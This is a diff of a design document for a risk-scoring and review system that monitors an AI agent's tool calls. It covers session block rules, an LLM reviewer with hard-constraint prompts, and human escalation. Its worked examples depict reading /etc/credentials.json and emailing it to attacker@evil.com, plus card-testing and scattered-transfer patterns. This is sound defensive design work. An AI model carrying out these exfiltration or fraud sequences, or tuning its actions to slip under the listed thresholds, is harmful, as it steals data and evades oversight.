+    /// Average value of an entity field across matching records.
+    pub fn avg(&self, field: &str, filter: &SessionFilter) -> Option<f64>;
 
-    def rate_per_minute(self, action_type: str) -> float:
-        """How many times per minute this action_type has fired."""
-        recent = self.recent(60)
-        return sum(1 for r in recent if r.action_type == action_type)
+    // ── Counting ─────────────────────────────────────────────
+    /// Count records matching filter + entity conditions.
+    pub fn count_where(&self, filter: &SessionFilter) -> usize;
 
-    def preceded_by(self, *action_types: str, within: int = 10) -> bool:
-        """True if all given action_types appeared in the last N actions."""
-        recent_types = {r.action_type for r in self.records[-within:]}
-        return all(t in recent_types for t in action_types)
+    /// Count distinct values of an entity field across matching records.
+    /// e.g. how many unique recipients received emails.
+    pub fn distinct_count(&self, field: &str, filter: &SessionFilter) -> usize;
+
+    /// Collect distinct values of an entity field.
+    pub fn distinct_values(&self, field: &str, filter: &SessionFilter) -> Vec<Value>;
+
+    // ── Frequency & time ─────────────────────────────────────
+    /// Rate per minute scoped to a time window.
+    pub fn rate_per_minute_windowed(
+        &self, action_type: &str, within_min: u64,
+    ) -> f64;
+
+    /// How long the session has been active (minutes).
+    pub fn duration_minutes(&self) -> f64;
+
+    /// Detects silence followed by a burst of activity.
+    pub fn idle_then_burst(
+        &self, idle_min: u64, burst_count: usize, burst_window_min: u64,
+    ) -> bool;
+
+    /// Detects accelerating action frequency over sliding windows.
+    pub fn accelerating(
+        &self, action_type: &str, window_count: usize, factor: f64,
+    ) -> bool;
+
+    // ── Pattern & set operations ─────────────────────────────
+    /// Ordered or unordered subsequence detection.
+    /// e.g. [files.read, db.select, email.send] appeared in order.
+    pub fn sequence(
+        &self, pattern: &[&str], within: usize, ordered: bool,
+    ) -> bool;
+
+    /// Number of distinct risk flags observed in a time window.
+    pub fn distinct_flags(&self, within_min: Option<u64>) -> usize;
+
+    /// Ratio of record counts matching two filters.
+    /// e.g. reads-to-writes ratio > 10 indicates reconnaissance.
+    pub fn ratio(
+        &self, numerator: &SessionFilter, denominator: &SessionFilter,
+    ) -> f64;
+}
 ```
 
-### Updated assess()
+### Session Amplifier Derivation
 
-`session` is passed as an optional argument, injected into `fields` under `_session` so `mutate()` can read it without changing the mutation API signature. After scoring, the result is appended to the session record.
+The `session` amplifier dimension (0–30) is derived automatically from session history:
 
-```python
-def assess(
-    action_type: str,
-    fields:      dict,
-    session:     SessionContext | None = None,
-) -> RiskScore:
-    if action_type not in ACTION_REGISTRY:
-        raise ValueError(
-            f"Unknown action type: {action_type!r}. "
-            f"Registered: {sorted(ACTION_REGISTRY)}"
-        )
-    base_fn, mutate_fn = ACTION_REGISTRY[action_type]
-    t = base_fn()
+```rust
+pub fn session_amplifier_score(session: &SessionContext) -> i32 {
+    if session.records.is_empty() { return 5; }  // baseline
 
-    # Inject session so mutate() can read it alongside entities
-    if session:
-        fields = {**fields, "_session": session}
+    let high_count = session.records.iter()
+        .filter(|r| r.tier >= Tier::High).count();
+    let medium_count = session.records.iter()
+        .filter(|r| r.tier == Tier::Medium).count();
+    let distinct_flags: HashSet<_> = session.records.iter()
+        .flat_map(|r| r.flags.iter()).collect();
 
-    mutate_fn(fields, t)
-    result = compute_hybrid(t)
-
-    # Record this action into the session after scoring
-    if session:
-        session.records.append(ActionRecord(
-            action_type=action_type,
-            tier=result.tier,
-            flags=result.flags,
-            timestamp=time.time(),
-            entities={k: v for k, v in fields.items() if not k.startswith("_")},
-        ))
-
-    return result
+    let score = high_count as i32 * 8
+              + medium_count as i32 * 3
+              + distinct_flags.len() as i32;
+    score.min(30)
+}
 ```
 
-### Session-aware mutation rules
+### Session Block Rules
 
-Each `mutate()` reads `_session` from fields and applies additional rules on top of the existing per-call rules. Existing rules are unchanged.
+Some patterns should trigger a hard block regardless of the individual call's score.
 
-```python
-# Inside EmailSend.mutate(), after existing rules
+| Rule | Condition | Reason |
+|---|---|---|
+| `privilege_escalation_then_exec` | action is shell or file write, preceded by iam.assign_role within 5 actions, max_tier >= HIGH | Execution after privilege escalation |
+| `read_then_exfiltrate` | action is email.send or http_post, EXPOSURE in last 3 flags, recipient is external | Sensitive data read followed by external send |
+| `bulk_external_send` | action is email.send, rate > 20/min | Email rate exceeds autonomous limit |
+| `cumulative_transfer_limit` | session.sum(amount, payments.transfer) >= $500k | Cumulative transfer amount exceeds session limit |
+| `card_testing` | 3+ charges < $2 to distinct customers within 10 min | Multiple micro-charges — possible card testing |
+| `scatter_transfer` | 5+ distinct transfer recipients within 60 min | Dispersed transfers to many recipients |
+| `privilege_then_large_transfer` | preceded by iam.assign_role within 5, cumulative transfers >= $10k | Large transfer following privilege escalation |
 
-session: SessionContext | None = fields.get("_session")
+Session block rules are evaluated in `compute_hybrid` as step 2b, after per-call block rules.
 
-if session:
-    # Rate: too many external sends in a short window
-    rate = session.rate_per_minute("email.send")
-    if rate > 20:
-        t.gate("Email send rate exceeds 20/min -- possible exfiltration")
-        return
-    elif rate > 5:
-        t.upgrade("volume", 15)
-        t.add("GOVERNANCE", "secondary")
+### Session-Aware Rules in YAML
 
-    # Pattern: sensitive read immediately before send
-    if session.preceded_by("files.read", "db.select", within=5):
-        t.upgrade("sensitivity", 12)
-        t.upgrade("destination", 8)
+Session rules are defined in the `session_rules` section of risk rule YAML files (see §7). The DSL provides these session conditions:
 
-    # Elevation: session already contains high-risk actions
-    if session.max_tier() >= Tier.HIGH:
-        t.upgrade("boundary", 6)
-        t.upgrade("scope", 6)
+**Existing (basic):**
 
+- `session.rate_per_minute` — actions per minute by type
+- `session.preceded_by` — whether specific action types appeared recently
+- `session.max_tier` — highest tier in the session so far
+- `session.flag_sequence` — flags from the last N actions
+- `session.count` — total actions matching type or flag
 
-# Inside ProcessShell.mutate(), after existing rules
+**Numeric aggregation:**
 
-session: SessionContext | None = fields.get("_session")
+- `session.sum` — cumulative sum of an entity field (e.g. total transfer amount)
+- `session.max` — maximum value of an entity field (e.g. largest single charge)
+- `session.min` — minimum value of an entity field (detects micro-transaction probing)
+- `session.avg` — average value of an entity field
 
-if session:
-    # Privilege escalation chain: role assigned then shell executed
-    if session.preceded_by("iam.assign_role", within=3):
-        t.upgrade("scope", 15)
-        t.upgrade("actor", 10)
-        t.add("PRIVILEGE")
+**Advanced counting:**
 
-    # Exfiltration pattern: EXPOSURE flag in recent history
-    recent_flags = session.flag_sequence(last_n=4)
-    if "EXPOSURE" in recent_flags:
-        t.upgrade("destination", 10)
-        t.upgrade("sensitivity", 8)
-```
+- `session.count_where` — count records matching entity conditions (e.g. external emails only)
+- `session.distinct_count` — count unique values of an entity field (e.g. distinct recipients)
 
-### Session-level Block Rules
+**Temporal patterns:**
 
-Some patterns should trigger a hard block regardless of the individual call's score. These are evaluated in `compute_hybrid` as a new step 2b, after per-call block rules.
+- `session.duration_minutes` — how long the session has been active
+- `session.idle_then_burst` — silence followed by a sudden burst of activity
+- `session.accelerating` — action frequency increasing over sliding windows
 
-```python
-@dataclass
-class SessionBlockRule:
-    name:      str
-    condition: Callable[[SessionContext, str, dict], bool]
-    reason:    str
+**Set & sequence operations:**
 
+- `session.sequence` — ordered or unordered subsequence detection across action types
+- `session.distinct_flags` — number of distinct risk flags observed in a time window
+- `session.ratio` — ratio between counts of two filtered groups (e.g. reads-to-writes)
 
-SESSION_BLOCK_RULES: list[SessionBlockRule] = [
-    SessionBlockRule(
-        name="privilege_escalation_then_exec",
-        condition=lambda s, action_type, fields: (
-            action_type in ("process.shell", "files.write")
-            and s.preceded_by("iam.assign_role", within=5)
-            and s.max_tier() >= Tier.HIGH
-        ),
-        reason="Execution after privilege escalation in same session",
-    ),
-    SessionBlockRule(
-        name="read_then_exfiltrate",
-        condition=lambda s, action_type, fields: (
-            action_type in ("email.send", "network.http_post")
-            and "EXPOSURE" in s.flag_sequence(last_n=3)
-            and fields.get("recipient_scope") == "external"
-        ),
-        reason="Sensitive data read followed by external send in same session",
-    ),
-    SessionBlockRule(
-        name="bulk_external_send",
-        condition=lambda s, action_type, fields: (
-            action_type == "email.send"
-            and s.rate_per_minute("email.send") > 20
-        ),
-        reason="Email send rate exceeds autonomous limit",
-    ),
-]
+All aggregation primitives support an optional `within_minutes` parameter for time-windowed queries. See [docs/dsl.md](dsl.md) §5 for the full specification.
 
-
-def compute_hybrid(
-    t:           RiskTemplate,
-    session:     SessionContext | None = None,
-    action_type: str = "",
-    fields:      dict | None = None,
-) -> RiskScore:
-    active_flags = list(t.flags.keys())
-    norm         = normalise_amps(t.amplifiers)
-
-    # Step 1 -- template gate
-    if t.blocked:
-        return to_risk_score(1.0, active_flags, t.block_reason,
-                             blocked=True, block_reason=t.block_reason)
-
-    # Step 2 -- per-call block rules
-    for rule in BLOCK_RULES:
-        if rule.condition(active_flags, norm):
-            return to_risk_score(1.0, active_flags, rule.reason,
-                                 blocked=True, block_reason=rule.reason)
-
-    # Step 2b -- session-level block rules
-    if session and action_type:
-        for rule in SESSION_BLOCK_RULES:
-            if rule.condition(session, action_type, fields or {}):
-                return to_risk_score(1.0, active_flags, rule.reason,
-                                     blocked=True, block_reason=rule.reason)
-
-    # Steps 3-6 unchanged
-    base = sum(
-        cfg["weight"] * _category_raw(active_flags, norm, cfg)
-        for cfg in CATEGORIES.values()
-    )
-    compound = 1.0
-    for dim in MULTIPLICATIVE_DIMS:
-        compound *= (1.0 + AMP_WEIGHTS[dim] * norm[dim])
-    add_boost = sum(AMP_WEIGHTS[d] * norm[d] for d in ADDITIVE_DIMS)
-    raw       = math.tanh(base * compound * (1.0 + add_boost) * 1.5)
-
-    reason = (
-        f"flags={active_flags}, base={base:.3f}, "
-        f"compound={compound:.3f}, add_boost={add_boost:.3f}"
-    )
-    score = to_risk_score(raw, active_flags, reason)
-
-    for child in t.children:
-        child_score = compute_hybrid(child)
-        if child_score.raw > score.raw:
-            score = child_score
-
-    return score
-```
-
-### Driving the `session` amplifier from history
-
-The `session` amplifier dimension (0-30) previously had to be set manually. With `SessionContext` it can be derived automatically, reflecting the true accumulated risk of the session.
-
-```python
-def session_amplifier_score(session: SessionContext) -> int:
-    """
-    Derive a raw session amplifier value (0-30) from session history.
-    Called inside mutate() to replace any manually set session value.
-    """
-    if not session.records:
-        return 5   # baseline: unknown session history
-
-    high_count   = sum(1 for r in session.records if r.tier >= Tier.HIGH)
-    medium_count = sum(1 for r in session.records if r.tier == Tier.MEDIUM)
-    distinct_flags = len(set(f for r in session.records for f in r.flags))
-
-    score = (
-        high_count   * 8 +   # each HIGH action adds significant weight
-        medium_count * 3 +   # each MEDIUM adds moderate weight
-        distinct_flags * 1   # breadth of risk types seen
-    )
-    return min(score, 30)    # capped at dimension ceiling
-
-
-# Usage inside any mutate():
-if session:
-    t.override("session", session_amplifier_score(session))
-```
-
-### Storage and lifecycle
+### Session Storage
 
 | Deployment | Storage | Notes |
 |---|---|---|
-| Development / single process | `dict[str, SessionContext]` in memory | Simple, no dependencies |
-| Production single node | Same in-memory dict | Reset on restart |
-| Production distributed | Redis with TTL | Key = session_id, TTL = 30 min or task completion |
-| Long-running agents | Persistent DB + in-memory cache | Needed if tasks span hours |
+| Development | In-memory HashMap | Simple, reset on restart |
+| Production single node | In-memory + periodic flush | Reset on restart |
+| Production distributed | Redis with TTL | Key = session_id, TTL = 30 min |
+| Long-running agents | Persistent DB + cache | Tasks spanning hours |
 
-Session lifetime should follow the natural task boundary. Clear the session when the agent task completes, not on a fixed timer. This way actions in the same task are correlated, but the same two actions in separate tasks are not falsely linked.
+Session lifetime follows task boundaries. Clear on task completion, not a fixed timer.
 
-### Worked example: read-then-exfiltrate
+### Worked Example: Read-Then-Exfiltrate
 
-```python
-session = SessionContext(session_id="task-42")
+```
+Session: task-42
 
-# Call 1: read sensitive file -- scores LOW on its own
-r1 = assess("files.read", {
-    "path": "/etc/credentials.json",
-    "environment": "production",
-}, session=session)
-print(f"call 1: {r1.tier.name}")   # -> LOW
+Call 1: files.read, path=/etc/credentials.json, environment=production
+  → tier=LOW (flags: [EXPOSURE, MUTATION])
 
-# Call 2: send email externally -- session rule fires
-r2 = assess("email.send", {
-    "recipient_scope": "external",
-    "to": "attacker@external.com",
-    "body": "here you go",
-    "environment": "production",
-}, session=session)
-print(f"call 2: {r2.tier.name}")   # -> HIGH  (sensitivity+12, destination+8)
-print(f"blocked: {r2.blocked}")    # -> False
+Call 2: email.send, recipient_scope=external, to=attacker@evil.com
+  → session rule: preceded_by [files.read] within 5 → upgrade sensitivity+12, destination+8
+  → tier=HIGH (elevated by session context)
 
-# Call 3: same pattern again -- session block rule fires
-r3 = assess("email.send", {
-    "recipient_scope": "external",
-    "to": "attacker@external.com",
-    "body": "and more",
-    "environment": "production",
-}, session=session)
-print(f"call 3: {r3.blocked}")         # -> True
-print(f"reason: {r3.block_reason}")
-# -> Sensitive data read followed by external send in same session
+Call 3: email.send, recipient_scope=external, to=attacker@evil.com
+  → session block rule: read_then_exfiltrate fires
+  → CRITICAL (blocked)
+  → reason: "Sensitive data read followed by external send in same session"
+```
+
+### Worked Example: Cumulative Transfer Escalation
+
+```
+Session: treasury-daily
+
+Call 1: payments.transfer, amount=$50k, recipient=bank_a
+  → session.sum(amount) = $50k → below all thresholds
+  → tier=MEDIUM (standard for external transfer)
+
+Call 2: payments.transfer, amount=$100k, recipient=bank_b
+  → session.sum(amount) = $150k → exceeds $100k threshold
+  → session rule fires: upgrade amount+15, scope+10
+  → tier=HIGH (elevated by cumulative amount)
+  → routes to Human
+
+Call 3: payments.transfer, amount=$400k, recipient=bank_c
+  → session.sum(amount) = $550k → exceeds $500k threshold
+  → session block rule: cumulative_transfer_limit fires
+  → CRITICAL (blocked)
+  → reason: "Cumulative transfer amount exceeds $500k in session"
+```
+
+### Worked Example: Card Testing Detection
+
+```
+Session: checkout-agent
+
+Call 1: payments.charge, amount=$0.50, customer=cus_aaa
+  → tier=LOW
+
+Call 2: payments.charge, amount=$1.00, customer=cus_bbb
+  → tier=LOW
+
+Call 3: payments.charge, amount=$0.75, customer=cus_ccc
+  → session.count_where(amount < $2) = 3
+  → session.distinct_count(customer) = 3
+  → session block rule: card_testing fires
+  → CRITICAL (blocked)
+  → reason: "Multiple small charges to different customers — possible card testing"
 ```
 
 ---
 
-## 14. Agent-in-the-Loop
+## 13. Agent-in-the-Loop
 
-The agent reviewer sits between the automatic scorer and human review. It handles MEDIUM-tier calls by applying contextual reasoning the scorer cannot: reading the task goal, inspecting session history, and comparing against prior decisions.
+The agent reviewer handles MEDIUM-tier calls by applying contextual reasoning the scorer cannot: reading the task goal, inspecting session history, and comparing against prior decisions.
 
-Its output is exactly two structured verdicts: **Human** or **Deny**. It cannot approve, cannot issue tokens, and cannot override policy.
+**Its output is exactly two verdicts: Human or Deny.** It cannot approve, cannot issue tokens, and cannot override policy.
 
-### Role boundaries
+### Role Boundaries
 
-| Role           | Input                            | Outputs                        | Cannot                                           |
-|----------------|----------------------------------|--------------------------------|--------------------------------------------------|
-| Scorer         | raw action + entities            | ALLOW / HUMAN / DENY / _AGENT_ | Read task goal or session intent                 |
-| Agent reviewer | MEDIUM calls only + full context | **Human or Deny only**         | Produce Allow, issue tokens, act without context |
-| Human          | Any call routed to Human         | Allow / Deny                   | --                                               |
+| Role | Input | Outputs | Cannot |
+|---|---|---|---|
+| Scorer | raw action + entities | ALLOW / HUMAN / DENY / _AGENT_ | Read task goal or session intent |
+| Agent reviewer | MEDIUM calls + full context | **Human or Deny only** | Produce Allow, issue tokens |
+| Human | Any call routed to Human | Allow / Deny | — |
 
-`_AGENT_` (italic) is the internal routing signal -- it never surfaces to callers.
+### When the Reviewer is Invoked
 
-### When the reviewer is invoked
+The reviewer is skipped (go straight to HUMAN) when:
 
-```python
-# Confidence threshold for denial -- tune via calibration.
-# The reviewer has only two outputs: HUMAN or DENY.
-# Low confidence always produces HUMAN, not DENY.
-# Uncertainty is a reason to involve a human, not to block.
-CONFIDENCE_THRESHOLDS = {
-    "deny_above": 0.90,   # only deny when very confident the action is wrong
-}
+- Action type is inherently high-stakes regardless of MEDIUM score: `payments.charge`, `payments.transfer`, `iam.assign_role`, `iam.generate_api_key`, `secrets.read`, `legal.sign_document`
+- Score >= 52 (top of MEDIUM band, too close to HIGH)
+- Session already contains a blocked action
 
-# Action types where agent review is skipped -- go straight to human.
-# These are inherently high-stakes; the reviewer adds no value here.
-ALWAYS_HUMAN_ACTION_TYPES = {
-    "payments.charge",
-    "payments.transfer",
-    "iam.assign_role",
-    "iam.generate_api_key",
-    "secrets.read",
-    "legal.sign_document",
-}
+### Confidence Thresholds
 
-
-def should_skip_agent_review(norm_action: dict, risk_score: RiskScore) -> bool:
-    """
-    Returns True when the agent reviewer adds no value and the call
-    should go straight to human review.
-
-    Skip when:
-    - Action type is always high-stakes regardless of MEDIUM score.
-    - Score >= 52: top of MEDIUM band, too close to HIGH to trust automation.
-    - Session already contains a blocked action (compromised context).
-    """
-    if norm_action.get("action_type") in ALWAYS_HUMAN_ACTION_TYPES:
-        return True
-    if risk_score.score >= 52:
-        return True
-    return False
+```
+deny_above: 0.90   # only deny when very confident the action is wrong
 ```
 
-### Input schema
+- DENY requires confidence >= 0.90 with a specific, grounded reason.
+- Below 0.90, deny is downgraded to HUMAN. **Uncertainty routes to a human, never to a block.**
+- Parse failures route to HUMAN.
 
-```python
-@dataclass
-class AgentReviewRequest:
-    # The call being reviewed
-    norm_action:     dict              # full normalized action
-    risk_score:      RiskScore         # from the scorer
-    raw_tool_call:   dict              # original verbatim payload
+### Input Schema
 
-    # Context the reviewer reasons over
-    task_goal:       str               # what the agent was asked to do
-    session:         SessionContext    # history of actions in this session
-    session_summary: str               # lightweight LLM summary of session
+The reviewer receives:
 
-    # Prior decisions for pattern matching
-    similar_past:    list[DecisionRecord]  # nearest neighbours from DB
-    org_policy:      str               # plain-text policy for this action type
-```
+| Field | Description |
+|---|---|
+| `norm_action` | Full normalized action |
+| `risk_score` | From the scorer |
+| `raw_tool_call` | Original verbatim payload |
+| `task_goal` | What the agent was asked to do |
+| `session` | Session history |
+| `session_summary` | Lightweight LLM summary |
+| `similar_past` | Nearest-neighbour decisions from DB |
+| `org_policy` | Plain-text policy for this action type |
 
-### Output schema
+### Output Schema
 
-```python
-class ReviewVerdict(str, Enum):
-    # Three outcomes -- maps directly to the three final Permissions.
-    ALLOW    = "allow"              # approve as-is, issue token
-    ATTENUATE = "attenuate"         # approve with narrowed scope, issue token
-    HUMAN    = "human_in_the_loop"  # escalate to human operator
-    DENY     = "deny"               # block, no token issued
-
-
-@dataclass
-class AgentReviewResponse:
-    verdict:          ReviewVerdict
-    reason:           str           # logged; shown to human if verdict is HUMAN
-    confidence:       float         # 0.0-1.0 -- below threshold forces HUMAN
-    attenuation:      dict | None   # scope overrides if verdict is ATTENUATE
-    escalate_reason:  str | None    # why human review is needed (verdict=HUMAN only)
-```
-
-### Reviewer prompt
-
-The reviewer is called with a tightly constrained system prompt. It has no tool access, no memory, and no ability to request more information -- only the data in `AgentReviewRequest`.
-
-```python
-REVIEWER_SYSTEM_PROMPT = """
-You are a security reviewer for an AI agent permission system.
-You will be shown a tool call that scored MEDIUM risk. Decide whether
-it should execute given the task context.
-
-Respond with a JSON object and nothing else:
-{
-  "verdict": "allow" | "attenuate" | "human_in_the_loop" | "deny",
-  "reason": "<one sentence>",
-  "confidence": <0.0 to 1.0>,
-  "attenuation": { <scope overrides> } | null,
-  "escalate_reason": "<why a human is needed>" | null
+```rust
+pub struct AgentReviewResponse {
+    pub verdict:         ReviewVerdict,   // Human or Deny
+    pub reason:          String,          // logged; shown to human if verdict is Human
+    pub confidence:      f64,             // 0.0–1.0
+    pub escalate_reason: Option<String>,  // why human review is needed
 }
 
-Verdict meanings:
-  allow             -- safe to execute as-is, issue capability token
-  attenuate         -- safe to execute with narrowed scope (fill attenuation field)
-  human_in_the_loop -- uncertain or suspicious, escalate to human operator
-  deny              -- clearly contradicts task goal or policy, block
+pub enum ReviewVerdict {
+    HumanInTheLoop,
+    Deny,
+}
+```
 
-Hard constraints you cannot override:
+### Reviewer Constraints
+
+The reviewer prompt includes hard constraints:
+
 - Never allow if the action contradicts the stated task goal.
 - Never allow if the action accesses data not mentioned in the task goal.
 - Never allow financial transfers to recipients not named in the task goal.
-- Always return human_in_the_loop if confidence < 0.7.
-- Always return human_in_the_loop if the session shows read-then-send-externally.
+- Always return Human if confidence < 0.7.
+- Always return Human if the session shows read-then-send-externally.
 - Never deny without a specific reason grounded in the data provided.
-"""
 
+### LLM Client
 
-def build_reviewer_prompt(req: AgentReviewRequest) -> str:
-    similar_str = "\n".join(
-        f"  [{r.permission}] {r.norm_action.get('action_type')} "
-        f"score={r.risk_score.score}"
-        for r in req.similar_past[:3]
-    )
-    session_lines = "\n".join(
-        f"  [{r.tier.name}] {r.action_type}"
-        for r in req.session.records[-5:]
-    )
-    return f"""
-TASK GOAL:
-{req.task_goal}
+The reviewer is pluggable via a trait:
 
-ACTION BEING REVIEWED:
-  type:     {req.norm_action.get('action_type')}
-  score:    {req.risk_score.score}/100  tier={req.risk_score.tier.name}
-  flags:    {req.risk_score.flags}
-  reason:   {req.risk_score.reason}
-  entities: {req.norm_action.get('entities')}
-
-SESSION SUMMARY:
-{req.session_summary}
-
-RECENT SESSION ACTIONS ({len(req.session.records)} total):
-{session_lines}
-
-SIMILAR PAST DECISIONS:
-{similar_str if similar_str else '  (none found)'}
-
-ORG POLICY:
-{req.org_policy}
-
-Respond with JSON only.
-"""
+```rust
+pub trait LlmClient: Send + Sync {
+    fn review(&self, prompt: &str) -> Result<String, LlmError>;
+}
 ```
 
-### Reviewer pipeline
+Implementations behind cargo features: `ollama`, `openai`, `mock`. Tests always use `mock`.
 
-```python
-import json
-
-
-@dataclass
-class AgentReviewResult:
-    response:  AgentReviewResponse
-    token:     CapabilityToken | None   # set if verdict is APPROVE*
-    escalated: bool                     # True if routed to human
-
-
-def run_agent_review(
-    req:     AgentReviewRequest,
-    db:      DecisionDB,
-    session: SessionContext,
-) -> AgentReviewResult:
-    """
-    Call the LLM reviewer, parse its verdict, issue token or escalate.
-    Any parse failure escalates -- never fails open.
-    """
-    prompt   = build_reviewer_prompt(req)
-    raw_resp = call_reviewer_llm(prompt)    # returns raw string
-
-    try:
-        parsed = json.loads(raw_resp)
-        resp   = AgentReviewResponse(
-            verdict=ReviewVerdict(parsed["verdict"]),
-            reason=parsed.get("reason", ""),
-            confidence=float(parsed.get("confidence", 0.0)),
-            attenuation=parsed.get("attenuation"),
-            escalate_reason=parsed.get("escalate_reason"),
-        )
-    except (json.JSONDecodeError, KeyError, ValueError) as e:
-        resp = AgentReviewResponse(
-            verdict=ReviewVerdict.HUMAN,
-            reason=f"Reviewer parse failure: {e}",
-            confidence=0.0,
-            attenuation=None,
-            escalate_reason="LLM reviewer returned unparseable response",
-        )
-
-    # Low confidence always routes to human regardless of stated verdict
-    # Deny requires high confidence. Below the threshold, downgrade to HUMAN.
-    # Uncertainty is not a reason to block -- it is a reason to involve a human.
-    if (
-        resp.verdict == ReviewVerdict.DENY
-        and resp.confidence < CONFIDENCE_THRESHOLDS["deny_above"]
-    ):
-        resp.verdict         = ReviewVerdict.HUMAN
-        resp.escalate_reason = (
-            f"Deny confidence {resp.confidence:.2f} below threshold "
-            f"{CONFIDENCE_THRESHOLDS['deny_above']} -- routing to human instead"
-        )
-        resp.deny_reason = None
-
-    # The reviewer never issues tokens. Two outcomes only.
-    if resp.verdict == ReviewVerdict.HUMAN:
-        db.log_escalation(req, resp)
-        return AgentReviewResult(response=resp, token=None, escalated=True)
-
-    # DENY: confident and grounded
-    db.log_denial(req, resp)
-    return AgentReviewResult(response=resp, token=None, escalated=False)
-```
-
-### Full MEDIUM handler
-
-```python
-def handle_medium(
-    tool_call:   dict,
-    norm_action: dict,
-    risk_score:  RiskScore,
-    task_goal:   str,
-    session:     SessionContext,
-    db:          DecisionDB,
-) -> tuple[str, CapabilityToken | None]:
-    """
-    Full handler for MEDIUM-tier tool calls.
-    Returns (final_permission, token).
-    """
-    # Fast-path: skip reviewer for always-escalate action types
-    if should_skip_agent_review(norm_action, risk_score):
-        db.log(tool_call, Permission.HUMAN, norm=norm_action,
-               risk_score=risk_score, source="skip_agent_review")
-        return Permission.HUMAN, None
-
-    # Fetch context for the reviewer
-    similar_past    = db.find_similar(norm_action, limit=3)
-    session_summary = summarise_session(session)
-    org_policy      = db.get_policy(norm_action.get("action_type", ""))
-
-    req    = AgentReviewRequest(
-        norm_action=norm_action,
-        risk_score=risk_score,
-        raw_tool_call=tool_call,
-        task_goal=task_goal,
-        session=session,
-        session_summary=session_summary,
-        similar_past=similar_past,
-        org_policy=org_policy,
-    )
-    result = run_agent_review(req, db, session)
-
-    # Reviewer has exactly two outcomes -- no token is ever issued here.
-    # Tokens are issued by human approval or by the scorer for low-risk calls.
-    if result.escalated:
-        # HUMAN: reviewer is uncertain or action is plausible but unverified
-        db.log(tool_call, Permission.HUMAN, norm=norm_action,
-               risk_score=risk_score,
-               reviewer_reason=result.response.escalate_reason or result.response.reason,
-               source="agent_review")
-        return Permission.HUMAN, None
-
-    # DENY: reviewer is confident (>= 0.90) the action contradicts task goal / policy
-    db.log(tool_call, Permission.DENY, norm=norm_action,
-           risk_score=risk_score,
-           reviewer_reason=result.response.deny_reason or result.response.reason,
-           source="agent_review")
-    return Permission.DENY, None
-```
-
-### Decision flow diagram
+### Decision Flow
 
 ```mermaid
 flowchart TD
-    M([MEDIUM score]) --> SK{"should_skip_agent_review?<br/>always-escalate type or score >= 52"}
+    M([MEDIUM score]) --> SK{"should_skip?<br/>always-human type or score >= 52"}
 
-    SK -->|yes| HL0([Human loop -- direct])
-    SK -->|no|  CTX["Fetch context<br/>task_goal, session, similar_past, org_policy"]
+    SK -->|yes| HL0([Human loop — direct])
+    SK -->|no|  CTX["Fetch context<br/>task_goal, session, similar, policy"]
 
-    CTX --> LLM["call_reviewer_llm()"]
+    CTX --> LLM["LLM reviewer"]
     LLM --> PV{"Parse + confidence check"}
 
     PV -->|"parse failure"| HLC([Human loop])
     PV -->|"deny but confidence < 0.90"| HLC
-    PV --> VD{"ReviewVerdict?"}
+    PV --> VD{"Verdict?"}
 
-    VD -->|"human (uncertain / plausible)"| HLV([Human loop])
-    VD -->|"deny (confidence >= 0.90)"| DN(["Deny<br/>log deny_reason"])
+    VD -->|"human (uncertain)"| HLV([Human loop])
+    VD -->|"deny (confident, grounded)"| DN(["Deny"])
 
     style HL0  fill:#BA7517,color:#FAEEDA
     style HLC  fill:#BA7517,color:#FAEEDA
@@ -2931,234 +2100,1516 @@ flowchart TD
     style DN   fill:#993C1D,color:#FAECE7
 ```
 
-### Learning from reviewer decisions
+### Learning from Reviewer Decisions
 
-Every reviewer decision is logged with its confidence score and reason. This builds a dataset that drives three improvements over time.
+1. **Promote to allowlist.** If humans consistently approve a pattern (>= 50 approvals, < 2% override rate), promote it to the allowlist so future calls skip scoring entirely.
+2. **Tune deny threshold.** If a reviewer denies at 0.91 and a human overrides to Allow, `deny_above` may be too low.
+3. **Grow always-human set.** Action types where the reviewer routes to Human > 80% of the time should be pre-routed to human directly.
 
-**1. Promote stable patterns to Allowlist** -- if a pattern has been routed to human review many times and the human always approves, it can be moved to the allowlist so future calls skip agent review and scoring entirely. Promotion comes only from human decision history (the reviewer never produces Allow):
+---
 
-```python
-def promote_to_allowlist(
-    db:                DecisionDB,
-    min_human_approvals: int   = 50,
-    max_override_rate:   float = 0.02,
-) -> list[str]:
-    """
-    Find patterns that humans have approved consistently enough to
-    promote to the allowlist, skipping agent review and scoring entirely.
-    Promotion only comes from human decision history -- the reviewer
-    never produces Allow, so reviewer verdicts are not counted here.
-    """
-    promoted   = []
-    candidates = db.find_human_approval_patterns(
-        min_count=min_human_approvals,
-        max_human_override_rate=max_override_rate,
-    )
-    for pattern_hash, pattern_norm in candidates:
-        _allowlist[pattern_hash] = Permission.ALLOW
-        promoted.append(pattern_hash)
-        db.log_promotion(pattern_hash, pattern_norm)
-    return promoted
+## 14. Learning System
+
+### Decision Records
+
+Every `get_permission()` call produces a `DecisionRecord` stored in the audit log:
+
+```rust
+pub struct DecisionRecord {
+    pub timestamp:      DateTime<Utc>,
+    pub tool_call:      Value,           // raw (redacted)
+    pub norm_action:    NormAction,
+    pub risk_score:     RiskScore,
+    pub permission:     Permission,
+    pub human_override: bool,
+    pub override_to:    Option<Permission>,
+    pub context:        DecisionContext,
+}
 ```
 
-**2. Tune the deny confidence threshold** -- if a reviewer denies at 0.91 confidence and a human later overrides to Allow, that is evidence `deny_above` is too low. Raise it. If the reviewer is rarely denying at all, it may be appropriate to lower it slightly.
+### Using Decisions as Training Data
 
-**3. Grow `ALWAYS_HUMAN_ACTION_TYPES`** -- action types where the reviewer consistently routes to Human (> 80% of the time) are not worth calling the LLM for. Pre-route them directly to human review and remove them from agent review entirely.
+Human overrides are the most valuable signal — they show where the automated score disagreed with human judgment.
 
-### Worked example
+```rust
+pub struct TrainingFeatures {
+    pub raw_score:      f64,
+    pub score:          u32,
+    pub tier:           Tier,
+    pub flag_count:     usize,
+    pub blocked:        bool,
+    pub flags:          HashMap<String, bool>,  // per-flag indicators
+    pub action_type:    String,
+    pub domain:         String,
+    pub verb:           String,
+    pub label:          Permission,             // what the human decided
+    pub was_overridden: bool,
+}
+```
 
-```python
-session = SessionContext(session_id="task-55")
+### Automation Escalation
 
-# Step 1: scorer returns MEDIUM
-norm    = normalize_action({
-    "tool": "bash",
-    "arguments": {"command": "gog gmail send --to cfo@myorg.com --subject Q3 --body 'See attached'"}
-}, org_domain="myorg.com")
+```
+Phase 1: all MEDIUM → Agent-in-the-loop
+Phase 2: well-understood MEDIUM → Allow (when approval rate >= 95% over 100+ examples)
+Phase 3: edge MEDIUM cases remain Agent-in-the-loop
+```
 
